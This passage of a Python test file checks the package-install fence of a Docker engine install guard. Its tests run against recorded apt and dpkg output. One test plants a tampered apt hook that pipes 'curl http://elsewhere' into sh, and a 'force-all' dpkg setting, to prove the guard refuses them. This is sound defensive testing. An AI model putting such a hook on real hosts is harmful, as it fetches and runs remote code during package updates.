"""Tests for the Docker engine install guard's package step (child 3b).

Governing specification: `SPECIFICATION/non-functional-requirements.md`
section "Docker engine install guard", "Package fence". Governing design:
`docs/docker-engine-guard-design.md`, Mechanism 5 as amended by R6, F6 and
G7, plus implementation rider point 4.

Every assertion here runs against RECORDED command output. The step reaches
the world through one injectable runner, so `apt-get`, `apt-cache`, `dpkg`
and `dpkg-deb` are never executed: the fake runner answers the output
measured from a real host and records the `Command` each step emitted, and
the assertions are on THAT argv. One real subprocess runs in this file —
the one that proves the default runner is wired to `subprocess` at all.
"""

from __future__ import annotations

import gzip
import hashlib
import importlib
import json
import os
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

__all__: list[str] = []

_RUNNER_MODULE = "livespec_dev_tooling.fleet._docker_engine_guard_package_runner"
_RUNNER_PATH = Path("livespec_dev_tooling/fleet/_docker_engine_guard_package_runner.py")
_AUDIT_PATH = Path("livespec_dev_tooling/fleet/_docker_engine_guard_package_audit.py")
_LEFTOVERS_PATH = Path("livespec_dev_tooling/fleet/_docker_engine_guard_package_leftovers.py")
_REUNPACK_PATH = Path("livespec_dev_tooling/fleet/_docker_engine_guard_package_reunpack.py")
_PACKAGES_MODULE = "livespec_dev_tooling.fleet._docker_engine_guard_packages"

# The versions measured on the gmktec host on 2026-10-15, and the archive
# file names `apt-get download` writes for them.
_ENGINE = ("docker.io", "29.1.3-0ubuntu4.1")
_SHIM = ("containerd", "2.2.2-0ubuntu1.1")

# The architecture every audited archive and every dpkg row here carries.
# It is a field of the match the re-unpack makes rather than a detail of
# the file name, so it is named once and read from both sides.
_ARCH = "amd64"

# What stands in for the downloaded archives. The bytes themselves are
# arbitrary; what matters is that the recorded archive-index stanza and the
# committed maintainer-script digests are taken FROM them, so a test that
# alters either side is the test that proves the comparison happens.
_DEB_BYTES = b"deb bytes"
_POSTINST = {
    _ENGINE[0]: "#!/bin/sh\nset -e\n# docker.io postinst, as read at the audit\n",
    _SHIM[0]: "#!/bin/sh\nset -e\n# containerd postinst, as read at the audit\n",
}


# The host apt and dpkg configuration a committed digest vouches for. Both
# are measured shapes: the apt fragment is what `01autoremove` carries on a
# stock noble host, and `log` is dpkg's own default `dpkg.cfg` line.
_APT_HOOK = 'APT::Get::AutomaticRemove "true";\n'
_DPKG_CFG = "log /var/log/dpkg.log\n"


def _digest(*, data: bytes) -> str:
    """The SHA256 the fence compares, in the hex spelling the index uses."""
    return hashlib.sha256(data).hexdigest()


def _config_files(*, etc: Path) -> dict[Path, str]:
    """The host configuration files the fence digest-checks, and their content."""
    return {
        etc / "apt" / "apt.conf.d" / "01autoremove": _APT_HOOK,
        etc / "dpkg" / "dpkg.cfg": _DPKG_CFG,
    }


def _config_dirs(*, etc: Path) -> tuple[Path, ...]:
    """The directories whose every file a committed digest has to cover.

    `dpkg.cfg.d` is deliberately one of them while nothing creates it
    here: a host that carries no fragment directory at all must pass, so
    an absent directory is zero uncovered files rather than a refusal.
    """
    return (etc / "apt" / "apt.conf.d", etc / "dpkg" / "dpkg.cfg.d")


def _deb_name(*, package: str, version: str) -> str:
    """The archive file name `apt-get download` writes for one allowlist row."""
    return f"{package}_{version}_{_ARCH}.deb"


def _control_listing(*, scripts: tuple[str, ...]) -> str:
    """`dpkg-deb -I <deb>`'s recorded output, carrying `scripts` as executables.

    The shape is measured and the ASTERISK is the load-bearing part of
    it: `dpkg-deb -I` with no member names lists the control archive's
    members before printing the control stanza, and only an EXECUTABLE
    member is marked. That mark is what picks the maintainer scripts out
    of a listing that also names `control` and `md5sums`.
    """
    members = "".join(
        f"     714 bytes,    10 lines   *  {script}             #!/bin/sh\n" for script in scripts
    )
    return (
        " new Debian package, version 2.0.\n"
        " size 20418432 bytes: control archive=4096 bytes.\n"
        "     503 bytes,    13 lines      control              \n"
        "   18274 bytes,   266 lines      md5sums              \n"
        f"{members}"
        " Package: docker.io\n"
        " Version: 29.1.3-0ubuntu4.1\n"
    )


def _control_listings() -> dict[str, str]:
    """Each audited archive's control listing, carrying exactly the allowed script.

    The DEFAULT for every runner, because every test but the one driving
    a changed script set needs the audited shape — one executable member,
    named by the committed allowlist.
    """
    return {
        _deb_name(package=package, version=version): _control_listing(scripts=("postinst",))
        for package, version in (_ENGINE, _SHIM)
    }


def _identity_stanza(*, package: str, version: str) -> str:
    """`dpkg-deb -f <deb> Package Version Architecture`'s recorded output.

    Asked for MORE than one field, `dpkg-deb -f` prints `Field: value`
    lines rather than the bare value a single field yields — and it
    prints them in the order the CONTROL FILE carries them rather than
    the order they were asked for. That is why the recorded shape here
    leads with `Architecture` in the middle: a reader indexing the answer
    by POSITION would pass against a stanza it had dictated the order of
    and fail against a real archive.
    """
    return f"Package: {package}\nArchitecture: {_ARCH}\nVersion: {version}\n"


def _control_stanzas() -> dict[str, str]:
    """Each audited archive's identity stanza, at the audited version.

    The DEFAULT for every runner, because the re-unpack matches the
    leftover against these: a test that drives a MISMATCH by overriding
    one is the test that proves the three-field comparison happens.
    """
    return {
        _deb_name(package=package, version=version): _identity_stanza(
            package=package, version=version
        )
        for package, version in (_ENGINE, _SHIM)
    }


def _index_stanza(*, package: str, version: str, digest: str) -> str:
    """One `apt-cache show` stanza, in the shape the archive index carries it."""
    return (
        f"Package: {package}\n"
        f"Version: {version}\n"
        "Architecture: amd64\n"
        f"Filename: pool/universe/d/{package}/{_deb_name(package=package, version=version)}\n"
        "Size: 20418432\n"
        f"SHA256: {digest}\n"
    )


# The control-archive read, and how many argv tokens it carries.
# `dpkg-deb -I <deb>` prints the whole archive's LISTING and
# `dpkg-deb -I <deb> <member>` prints one member's bytes, so the two
# reads share every token a prefix can match and differ only in ARITY.
_CONTROL_READ = ("dpkg-deb", "-I")
_LISTING_ARGC = 3


# The two `dpkg-deb -f` reads, and how many argv tokens the second one
# carries. The audit asks for ONE field (`Version`) and gets the bare
# value; the re-unpack asks for THREE (`Package Version Architecture`)
# and gets a stanza. Exactly as with the control reads above, the two
# share every token a prefix can match and differ only in ARITY.
_FIELD_READ = ("dpkg-deb", "-f")
_IDENTITY_ARGC = 6

# The leftover's architecture, read one package at a time: the only
# `dpkg-query` the fence makes that NAMES a package, so the token count
# is again what tells it from the whole-table read every test queues.
_ARCH_QUERY_ARGC = 5


@dataclass(kw_only=True)
class _RecordedRunner:
    """The one injectable runner, answering RECORDED output and recording each call.

    `outputs` pairs an argv prefix with the output measured for it on a
    real host. A prefix carrying more than one output answers them in
    order and then repeats the last, which is how the SAME `dpkg-query`
    the fence runs on both sides of the install answers the host before
    the engine landed and then the host after it.

    `listings` and `identities` are keyed by archive file name rather
    than by a prefix, because the control-archive listing and the
    identity stanza are the answers no prefix can select — see
    `_CONTROL_READ` and `_FIELD_READ` above. `architectures` is keyed by
    PACKAGE name and answers `_ARCH` for anything it does not carry, so
    only a test driving an architecture mismatch has to say anything.
    """

    result: Any
    outputs: list[tuple[tuple[str, ...], list[str]]] = field(default_factory=list)
    listings: dict[str, str] = field(default_factory=_control_listings)
    identities: dict[str, str] = field(default_factory=_control_stanzas)
    architectures: dict[str, str] = field(default_factory=dict)
    calls: list[Any] = field(default_factory=list)

    def __call__(self, *, command: Any) -> Any:
        self.calls.append(command)
        if tuple(command.argv[:2]) == _CONTROL_READ and len(command.argv) == _LISTING_ARGC:
            return self.result(
                returncode=0, stdout=self.listings.get(Path(command.argv[2]).name, "")
            )
        if tuple(command.argv[:2]) == _FIELD_READ and len(command.argv) == _IDENTITY_ARGC:
            return self.result(
                returncode=0, stdout=self.identities.get(Path(command.argv[2]).name, "")
            )
        if command.argv[0] == "dpkg-query" and len(command.argv) == _ARCH_QUERY_ARGC:
            return self.result(
                returncode=0, stdout=self.architectures.get(command.argv[4], f"{_ARCH}\n")
            )
        for prefix, queued in self.outputs:
            if tuple(command.argv[: len(prefix)]) == prefix:
                return self.result(
                    returncode=0,
                    stdout=queued.pop(0) if len(queued) > 1 else queued[0],
                )
        return self.result(returncode=0, stdout="")


# `dpkg-query`'s recorded output in the format the fence asks for: the host
# before the engine lands, and the same host after it. The third line is
# measured output and not padding — `dpkg-query -W` lists a package dpkg
# merely KNOWS OF, from some dependency, with an EMPTY version field and
# the status `not-installed`. Admitted as a package at some version it
# would be a phantom in both the difference and the drift comparison.
_QUERY_BEFORE = """adduser 3.137ubuntu1 installed
libc6 2.39-0ubuntu8.4 installed
docker-compose-v2  not-installed
"""
_QUERY_AFTER = """adduser 3.137ubuntu1 installed
libc6 2.39-0ubuntu8.4 installed
docker-compose-v2  not-installed
containerd 2.2.2-0ubuntu1.1 installed
docker.io 29.1.3-0ubuntu4.1 installed
"""


# The table a kill during `dpkg -i`'s UNPACK leaves, which is FAULTS B-06
# and M-04 measured on poweredge guard-vm-0 and guard-vm-2 on 2026-10-17:
# the shim this transaction had already unpacked, and the engine
# `half-installed` — the state dpkg documents as needing reinstallation
# and refuses to configure.
_QUERY_INTERRUPTED_UNPACK = (
    f"{_QUERY_BEFORE}{_SHIM[0]} {_SHIM[1]} unpacked\n{_ENGINE[0]} {_ENGINE[1]} half-installed\n"
)

# The same table once the re-unpack moved the engine to `unpacked`, which
# is the state `dpkg --configure` can complete. Proven on guard-vm-1 the
# same evening.
_QUERY_RE_UNPACKED = (
    f"{_QUERY_BEFORE}{_SHIM[0]} {_SHIM[1]} unpacked\n{_ENGINE[0]} {_ENGINE[1]} unpacked\n"
)

# A version NO audited archive of the run carries — the engine's previous
# security update, which is exactly what a cache or a host one run behind
# would be holding.
_OTHER_VERSION = "29.1.2-0ubuntu4"

# The interrupted table with the half-installed engine at that version,
# so no audited `.deb` of the run matches it on all three fields.
_QUERY_UNAUDITED_HALF_INSTALLED = (
    f"{_QUERY_BEFORE}{_SHIM[0]} {_SHIM[1]} unpacked\n"
    f"{_ENGINE[0]} {_OTHER_VERSION} half-installed\n"
)


# `apt-get -s install`'s recorded output for the audited set on a host that
# has never carried the engine: the two `Inst` lines carry a version in
# parentheses and NO bracketed version before it, which is what an install
# of a package not currently held looks like.
_SIMULATION_CLEAN = """NOTE: This is only a simulation!
      apt-get needs root privileges for real execution.
Reading package lists...
Building dependency tree...
The following NEW packages will be installed:
  containerd docker.io
0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.
Inst containerd (2.2.2-0ubuntu1.1 Ubuntu:24.04/noble-updates [amd64])
Inst docker.io (29.1.3-0ubuntu4.1 Ubuntu:24.04/noble-updates [amd64])
Conf containerd (2.2.2-0ubuntu1.1 Ubuntu:24.04/noble-updates [amd64])
Conf docker.io (29.1.3-0ubuntu4.1 Ubuntu:24.04/noble-updates [amd64])
"""


# The same simulation on a host that ALREADY carries both audited
# packages at their audited versions — the re-run case. apt reports each
# as already the newest version and emits no `Inst` line at all, so the
# simulation clears and the step reaches the install with nothing to do.
_SIMULATION_SETTLED = """NOTE: This is only a simulation!
      apt-get needs root privileges for real execution.
Reading package lists...
Building dependency tree...
containerd is already the newest version (2.2.2-0ubuntu1.1).
docker.io is already the newest version (29.1.3-0ubuntu4.1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
"""


def _fenced_outputs() -> list[tuple[tuple[str, ...], list[str]]]:
    """The output a clean fenced transaction measures, command by command.

    Three of these are QUEUED per-package rather than answered once,
    because the fence asks each question once per allowlist row and the
    answers differ by row: the index stanza, the control version and the
    maintainer script. They are queued in the order the allowlist
    declares, which is the order the audit walks it in.
    """
    return [
        (("apt-get", "-s"), [_SIMULATION_CLEAN]),
        (
            ("apt-cache", "show"),
            [
                _index_stanza(package=package, version=version, digest=_digest(data=_DEB_BYTES))
                for package, version in (_ENGINE, _SHIM)
            ],
        ),
        (("dpkg-deb", "-f"), [f"{_ENGINE[1]}\n", f"{_SHIM[1]}\n"]),
        (("dpkg-deb", "-I"), [_POSTINST[_ENGINE[0]], _POSTINST[_SHIM[0]]]),
        (("dpkg-query",), [_QUERY_BEFORE, _QUERY_BEFORE, _QUERY_AFTER]),
    ]


def _payload(*, cache: Path) -> dict[str, Any]:
    """The committed package inputs a controller uploads for one run."""
    etc = cache.parent / "etc"
    return {
        "cache": str(cache),
        "config_digests": {
            path.as_posix(): _digest(data=text.encode("utf-8"))
            for path, text in _config_files(etc=etc).items()
        },
        "config_dirs": [directory.as_posix() for directory in _config_dirs(etc=etc)],
        "allow": [
            {
                "package": package,
                "version": version,
                "deb": _deb_name(package=package, version=version),
                "scripts": {"postinst": _digest(data=_POSTINST[package].encode("utf-8"))},
            }
            for package, version in (_ENGINE, _SHIM)
        ],
    }


def _declare(*, root: Path, payload: dict[str, Any]) -> Path:
    """Lay out one run's directory with `payload` as its package inputs.

    The downloaded archives are placed in the cache the payload names,
    because the step's own download goes through the fake runner and so
    writes nothing: the files standing in for its result are these.
    """
    cache = Path(str(payload["cache"]))
    cache.mkdir(parents=True, exist_ok=True)
    for package, version in (_ENGINE, _SHIM):
        (cache / _deb_name(package=package, version=version)).write_bytes(_DEB_BYTES)
    for path, text in _config_files(etc=cache.parent / "etc").items():
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    inputs = root / "runs" / "run-a" / "inputs"
    inputs.mkdir(parents=True, exist_ok=True)
    (inputs / "packages.json").write_text(json.dumps(payload), encoding="utf-8")
    return inputs


def _calls_named(*, runner: _RecordedRunner, argv: tuple[str, ...]) -> list[Any]:
    """Every recorded command whose argv begins with `argv`."""
    return [call for call in runner.calls if tuple(call.argv[: len(argv)]) == argv]


def _record_earlier_runs(*, root: Path) -> None:
    """Two neighbours of this run: one that recorded an intended set, one broken.

    The first is what implementation rider point 4 is about — a run that
    rolled back from `publishing` leaving its own packages part-installed.
    The second is a record interrupted mid-write, which must be skipped
    rather than read as a reason to stop.
    """
    earlier = root / "runs" / "run-earlier"
    earlier.mkdir(parents=True, exist_ok=True)
    (earlier / "intended.json").write_text(
        json.dumps({"run": "run-earlier", "additions": ["runc=1.4.0-0ubuntu1", "tini=0.19.0-1"]}),
        encoding="utf-8",
    )
    broken = root / "runs" / "run-broken"
    broken.mkdir(parents=True, exist_ok=True)
    (broken / "intended.json").write_text("{half-written", encoding="utf-8")


def _audit_report(*, packages: tuple[str, ...]) -> str:
    """`dpkg --audit`'s recorded output naming `packages`, headers and all.

    The shape is load-bearing: the headers wrap onto unindented
    continuation lines and only the package rows are indented, which is
    the whole of how the names are picked out of it.
    """
    rows = "".join(
        f" {name}                        a package this host carries\n" for name in packages
    )
    return (
        "The following packages have been unpacked but not yet configured.\n"
        "They must be configured using dpkg --configure or the configure\n"
        "menu option in dselect for them to work:\n"
        f"{rows}"
        "\n"
    )


# The instant the most recent pre-install audit record was written, and a
# neighbour an hour earlier for the arms about WHICH record is the most
# recent one. Fixed rather than taken from the clock, because the whole
# comparison below is of dpkg's own log timestamps against this second.
_RECORD_WRITTEN_AT = time.mktime((2026, 10, 17, 13, 0, 1, 0, 0, -1))
_EARLIER_RECORD_AT = _RECORD_WRITTEN_AT - 3600


# What dpkg logged for the guard's OWN interrupted `dpkg -i`, in the shape
# `/var/log/dpkg.log` carries it. This is the whole mechanism the second
# arm of the leftover rule rests on, so every line is measured rather than
# illustrative: the `install` line names an audited package, which a guard
# run's recorded intended set covers, and the trigger handler this install
# ACTIVATED appears as `trigproc` and `status` — never as one of the five
# actions the fence reads. That is what leaves man-db attributable to the
# guard while a package another transaction installed is not.
#
# The last line is the kill itself: dpkg was SIGKILLed mid-write, so the
# log ends in a torn line carrying no action at all.
_LOG_OWN_INSTALL = """2026-10-17 13:00:02 startup archives unpack
2026-10-17 13:00:02 install docker.io:amd64 <none> 29.1.3-0ubuntu4.1
2026-10-17 13:00:03 status unpacked docker.io:amd64 29.1.3-0ubuntu4.1
2026-10-17 13:00:04 trigproc man-db:amd64 2.12.0-4build2 <none>
2026-10-17 13:00:04 status half-configured man-db:amd64 2.12.0-4build2
2026-10-17 13:00:0
"""

# An `install` of a package no guard run ever intended, BEFORE the most
# recent pre-install audit record was written. Every arm carries it: it is
# the control that proves the comparison is against that record's instant
# rather than against the log as a whole, since a host that has ever
# installed anything outside the guard's sets would otherwise never
# attribute a leftover again.
_LOG_OLD_FOREIGN = "2026-10-01 09:00:00 install nginx:amd64 <none> 1.24.0-2ubuntu7\n"

# The same action AFTER that record was written, which is the transaction
# the second arm exists to rule out.
_LOG_FOREIGN_INSTALL = "2026-10-17 13:05:00 install nginx:amd64 <none> 1.24.0-2ubuntu7\n"


def _audit_record(*, run: str, flagged: tuple[str, ...]) -> str:
    """One pre-install audit record, in the shape the step itself writes it."""
    return json.dumps({"run": run, "flagged": list(flagged)})


def _record_pre_install_audit(*, root: Path, run: str, data: str, written_at: float) -> None:
    """Lay down `run`'s pre-install audit record, stamped when it was written.

    The modification time IS "when that record was written": the step
    renames it into place through `write_durable` and the record carries
    no timestamp of its own. The tests set it explicitly so the
    comparison against dpkg's log is against a known second.
    """
    directory = root / "runs" / run
    directory.mkdir(parents=True, exist_ok=True)
    record = directory / "pre-install-audit.json"
    record.write_text(data, encoding="utf-8")
    os.utime(record, (written_at, written_at))


def _dpkg_log(*, root: Path, members: dict[str, bytes]) -> Path:
    """dpkg's log, and every rotation of it beside it, as a host keeps them.

    Keyed by file NAME and written as bytes because the rotated series is
    part of the subject: logrotate moves the current file aside and
    compresses the older copies, so a member can be gzip rather than
    text. The CURRENT file's path is what the step is handed; it finds
    the rest beside it.
    """
    directory = root / "log"
    directory.mkdir(parents=True, exist_ok=True)
    for name, data in members.items():
        (directory / name).write_bytes(data)
    return directory / "dpkg.log"


def _own_install_log(*, root: Path) -> Path:
    """dpkg's log on a host whose only recent transaction was the guard's own."""
    return _dpkg_log(
        root=root,
        members={"dpkg.log": (_LOG_OLD_FOREIGN + _LOG_OWN_INSTALL).encode("utf-8")},
    )


def _leftover_outputs(*, result: Any, flagged: tuple[str, ...], query: str) -> _RecordedRunner:
    """The recorded host FAULTS B-06 left: settled audited set, `flagged` pending.

    The simulation is the SETTLED one, because that is the host the
    scenario is about — a kill during `dpkg -i` that left every audited
    package installed and the trigger handler it activated unfinished, so
    the resumed publish has no transaction to repeat and the only
    outstanding work is the handler.
    """
    return _RecordedRunner(
        result=result,
        outputs=[
            (("apt-get", "-s"), [_SIMULATION_SETTLED]),
            # The report, and then the re-read a successful recovery leaves
            # clean — design F6's empty audit, which the step requires.
            (("dpkg", "--audit"), [_audit_report(packages=flagged), ""]),
            (("dpkg-query",), [query]),
            *_fenced_outputs(),
        ],
    )


def _interrupted_unpack_outputs(*, result: Any, table: str) -> _RecordedRunner:
    """The recorded host a kill during `dpkg -i`'s unpack of the engine left.

    `table` is what `dpkg-query` answers from the SECOND read on, so a
    test can say whether the re-unpack took: the first two answers are
    the interrupted table — the versions the audit relied on, and the
    same table re-read immediately before the mutation — and everything
    after them is `table`. The queue therefore holds the same answer for
    the re-read the recovery makes and for the post-install read, which
    is what keeps the shape independent of how many times the step asks.

    The simulation is the SETTLED one: dpkg already holds a row for both
    audited packages, so apt reports each as already the newest version
    and emits no `Inst` line at all.
    """
    return _RecordedRunner(
        result=result,
        outputs=[
            (("apt-get", "-s"), [_SIMULATION_SETTLED]),
            (
                ("dpkg", "--audit"),
                [_audit_report(packages=(_ENGINE[0], _SHIM[0])), ""],
            ),
            (("dpkg-query",), [_QUERY_INTERRUPTED_UNPACK, _QUERY_INTERRUPTED_UNPACK, table]),
            *_fenced_outputs(),
        ],
    )


def test_the_package_step_re_unpacks_a_half_installed_leftover_from_its_archive(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the re-unpack, before any `dpkg --configure`.

    FAULTS B-06 on poweredge guard-vm-0 and M-04 on guard-vm-2,
    2026-10-17 against release v1.112.10: the publish unit and dpkg were
    SIGKILLed while `dpkg -i` UNPACKED docker.io, which left it
    `half-installed` with its list and md5sums control files missing.
    dpkg cannot configure that state — it answers `package docker.io is
    not ready for configuration / cannot configure (current status
    'half-installed')` and exits 1 — so a recovery aiming `--configure`
    at it could never clear it; and because the step may issue `dpkg -i`
    only over an EMPTY `dpkg --audit`, every later run on that host
    refused identically and rolled back.

    What clears it is re-unpacking the package's own audited archive,
    proven on guard-vm-1 the same evening. The archive is matched to the
    leftover on package name, version and architecture, and the unpack
    runs BEFORE the `dpkg --configure` the rest of the recovery issues,
    because the state that configure is aimed at is the one the unpack
    produces.
    """
    assert _REUNPACK_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    runner = _interrupted_unpack_outputs(
        result=runner_module.CommandOutput, table=_QUERY_RE_UNPACKED
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    unpacked = _calls_named(runner=runner, argv=("dpkg", "--unpack"))
    assert len(unpacked) == 1
    assert tuple(unpacked[0].argv) == (
        "dpkg",
        "--unpack",
        str(tmp_path / "cache" / _deb_name(package=_ENGINE[0], version=_ENGINE[1])),
    )
    configured = _calls_named(runner=runner, argv=("dpkg", "--configure"))
    assert runner.calls.index(unpacked[0]) < runner.calls.index(configured[0])


def test_the_package_step_refuses_a_half_installed_leftover_no_audited_deb_matches(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the re-unpack's refusal, on both fields.

    The scenario's second arm. A package `half-installed` at a version
    or an architecture this run's audited set does not carry cannot be
    re-unpacked from that set at all, and the one thing the step may not
    do about it is unpack a NEIGHBOURING archive: the audit cleared each
    `.deb` for the allowlist row it belongs to, so installing one over
    another package's interrupted unpack would be a transaction nobody
    audited, aimed at a database already holding an unfinished one.

    Both mismatching fields are driven, because a comparison on name and
    version alone would pass the architecture case silently — the
    half-installed row and the archive agree on every field it reads.
    Neither arm may issue `dpkg --unpack`, and neither may reach
    `dpkg -i`: design F6 requires a fresh transaction to start from an
    empty `dpkg --audit`, and this report can no longer be emptied.
    """
    assert _REUNPACK_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))

    for table, architectures, expected in (
        (_QUERY_UNAUDITED_HALF_INSTALLED, {}, _OTHER_VERSION),
        (_QUERY_INTERRUPTED_UNPACK, {_ENGINE[0]: "arm64\n"}, "arm64"),
    ):
        runner = _RecordedRunner(
            result=runner_module.CommandOutput,
            architectures=architectures,
            outputs=[
                (("apt-get", "-s"), [_SIMULATION_SETTLED]),
                (("dpkg", "--audit"), [_audit_report(packages=(_ENGINE[0], _SHIM[0])), ""]),
                (("dpkg-query",), [table]),
                *_fenced_outputs(),
            ],
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert _ENGINE[0] in outcome.refusal
        assert expected in outcome.refusal
        assert outcome.installed == ()
        assert _calls_named(runner=runner, argv=("dpkg", "--unpack")) == []
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_every_dpkg_unpack_names_an_audited_deb_under_the_frontend_lock(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the fence around the re-unpack itself.

    Two halves, and each is the fence rather than a convenience. The
    unpack may name NO file that is not one of this run's audited `.deb`
    files, because an archive outside that set is bytes the audit never
    digested and never compared against the index — the re-unpack would
    otherwise be the one way into this step for an unaudited package.
    And `DPKG_FRONTEND_LOCKED=1` is what tells dpkg that its caller
    already holds the frontend lock (design R6): the recovery runs inside
    the same held lock as the install, so without it this dpkg takes the
    lock itself and deadlocks against the role's lock-holding helper.
    """
    assert _REUNPACK_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    audited = {
        str(tmp_path / "cache" / _deb_name(package=package, version=version))
        for package, version in (_ENGINE, _SHIM)
    }
    runner = _interrupted_unpack_outputs(
        result=runner_module.CommandOutput, table=_QUERY_RE_UNPACKED
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    unpacked = _calls_named(runner=runner, argv=("dpkg", "--unpack"))
    assert unpacked
    for call in unpacked:
        assert set(call.argv[2:]) <= audited
        assert call.env == {"DPKG_FRONTEND_LOCKED": "1"}


def test_the_package_step_installs_exactly_the_audited_debs_under_the_frontend_lock(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": `dpkg -i` on exactly the audited files.

    Two halves, and both are the fence rather than a convenience. The argv
    is the audited `.deb` SET and nothing else, so the transaction that
    runs is byte-for-byte the one the audit cleared with no resolver
    decision left to apt. And `DPKG_FRONTEND_LOCKED=1` is what tells dpkg
    that its caller already holds the frontend lock (design R6) — without
    it dpkg takes the lock itself and the role's lock-holding helper, which
    has held it since the audit, deadlocks against its own install.
    """
    assert _RUNNER_PATH.is_file()
    assert _AUDIT_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    runner = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    installed = _calls_named(runner=runner, argv=("dpkg", "-i"))
    assert len(installed) == 1
    assert tuple(installed[0].argv) == (
        "dpkg",
        "-i",
        str(tmp_path / "cache" / _deb_name(package=_ENGINE[0], version=_ENGINE[1])),
        str(tmp_path / "cache" / _deb_name(package=_SHIM[0], version=_SHIM[1])),
    )
    assert installed[0].env == {"DPKG_FRONTEND_LOCKED": "1"}
    assert installed[0].timeout_seconds == runner_module.INSTALL_TIMEOUT_SECONDS


def test_the_package_step_refuses_a_simulated_transaction_the_allowlist_does_not_cover(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the three shapes a simulation may not have.

    The simulation is run with `--no-install-recommends --no-remove` and
    the exact pinned specs, so the only transaction apt is asked about is
    the committed one — and then the answer is read line by line anyway,
    because `--no-remove` makes a removal an apt ERROR rather than a
    silent `Remv`, and a resolver that satisfies the pins by UPGRADING
    something already installed has broken nothing apt would complain
    about. Each of the three refuses before anything is mutated.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    clean = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

    assert packages.run_package_step(inputs=inputs, runner=clean).refusal is None
    simulated = _calls_named(runner=clean, argv=("apt-get", "-s"))
    assert len(simulated) == 1
    assert tuple(simulated[0].argv) == (
        "apt-get",
        "-s",
        "install",
        "--no-install-recommends",
        "--no-remove",
        "docker.io=29.1.3-0ubuntu4.1",
        "containerd=2.2.2-0ubuntu1.1",
    )

    for answer, expected in (
        (
            _SIMULATION_CLEAN + "Inst runc (1.4.0-0ubuntu1 Ubuntu:24.04/noble [amd64])\n",
            "runc=1.4.0-0ubuntu1",
        ),
        (_SIMULATION_CLEAN + "Remv containerd [1.7.27-0ubuntu1]\n", "removes containerd"),
        (
            _SIMULATION_CLEAN
            + "Inst libc6 [2.39-0ubuntu8.3] (2.39-0ubuntu8.4 Ubuntu:24.04/noble-updates)\n",
            "upgrades the installed libc6",
        ),
    ):
        runner = _RecordedRunner(
            result=runner_module.CommandOutput,
            outputs=[(("apt-get", "-s"), [answer]), (("dpkg-query",), [_QUERY_BEFORE])],
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_refuses_host_apt_and_dpkg_configuration_it_did_not_commit(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": a committed digest covers every such file.

    Neither kind is incidental to a fenced install. An apt hook is a
    program apt runs around every transaction, and a `dpkg.cfg.d`
    fragment can rewrite what unpacking MEANS — a `force-all`, a
    `path-exclude` — so an unexpected one is exactly the gap between the
    transaction that was audited and what the host then does with it.

    A file no committed digest covers refuses too, and that half is the
    point: a check that only verified the files it already knew about
    would be entirely silent about one that was ADDED, which is the
    cheaper attack and the likelier accident.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    payload = _payload(cache=tmp_path / "cache")
    hook = tmp_path / "etc" / "apt" / "apt.conf.d" / "01autoremove"
    config = tmp_path / "etc" / "dpkg" / "dpkg.cfg"
    stranger = tmp_path / "etc" / "apt" / "apt.conf.d" / "99-unexpected"

    for mutate, expected in (
        (
            lambda: hook.write_text(
                'APT::Update::Pre-Invoke {"curl http://elsewhere | sh";};\n', encoding="utf-8"
            ),
            "differs from its committed digest",
        ),
        (lambda: config.write_text("force-all\n", encoding="utf-8"), "differs from its committed"),
        (
            lambda: stranger.write_text('APT::Get::Assume-Yes "true";\n', encoding="utf-8"),
            "no committed digest covers",
        ),
        (lambda: hook.unlink(), "absent from this host"),
    ):
        inputs = _declare(root=tmp_path, payload=payload)
        stranger.unlink(missing_ok=True)
        mutate()
        runner = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        # Refused before anything was so much as simulated, let alone run.
        assert runner.calls == []


def test_the_package_step_refuses_a_deb_the_archive_index_and_digests_do_not_vouch_for(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the two ways a downloaded archive refuses.

    The SHA256 is compared against the ARCHIVE INDEX entry for that exact
    (package, version) rather than against a digest committed in the role,
    which is the point of design R6: the index is the archive's own
    statement about the file, so the comparison catches a mirror serving
